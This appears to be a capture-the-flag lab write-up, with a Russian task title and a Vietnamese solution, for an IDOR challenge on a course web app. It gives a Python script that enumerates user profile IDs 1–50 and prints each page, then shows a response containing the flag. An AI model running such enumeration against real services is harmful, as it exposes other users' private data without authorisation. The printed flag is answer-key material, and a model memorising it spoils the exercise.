# Уязвимость IDOR
Найдите флаг в имени одного из пользователей

----
Đầu tiên hãy tạo tài khoản và đăng nhập

Có thể tự động kiểm tra như sau:

```python
import requests

# URL cơ bản
base_url = "https://d971719e-b86d-4cea-b332-1fbc5fa2adf6-idor-webapp.web.lms.itmo.xyz/user/"

# Phạm vi ID bạn muốn kiểm tra
start_id = 1
end_id = 50  # Bạn có thể thay đổi giới hạn ID theo nhu cầu

for user_id in range(start_id, end_id + 1):
    # Tạo URL với ID hiện tại
    url = f"{base_url}{user_id}"
    
    try:
        # Gửi yêu cầu GET
        response = requests.get(url)
        
        # Kiểm tra mã trạng thái phản hồi
        if response.status_code == 200:
            print(f"User ID: {user_id}")
            print(response.text)  # In ra nội dung phản hồi
            print("-" * 50)  # Dấu phân cách giữa các phản hồi
        else:
            print(f"User ID: {user_id} - Không tìm thấy (Mã trạng thái: {response.status_code})")
    except Exception as e:
        print(f"Đã xảy ra lỗi khi truy cập {url}: {e}")
```

**Nó sẽ trả về kết quả ứng với từng user**

```html
<div class="container">
    <div class="jumbotron">
        <h1>👥 User catalog</h1>
    </div>
    <div class="col-md-12">
        <a href="/profile">My profile</a>
    </div>
    <div class="col-md-12">
        
          
        
    </div>
    <div class="col-md-12">
        <br>
        <h3>User details:</h3>
        <table class="table">
          <tr><td>Name</td><td>flag: edaa25b7f65b833fb02df995b03dc5e300dd27f9dece51ab9ae1765872f4becbb36282cd1d55f975c71c731a8ee9f0a4
</td></tr>
        </table>
    </div>
    <footer>&nbsp;</footer>
</div>
```
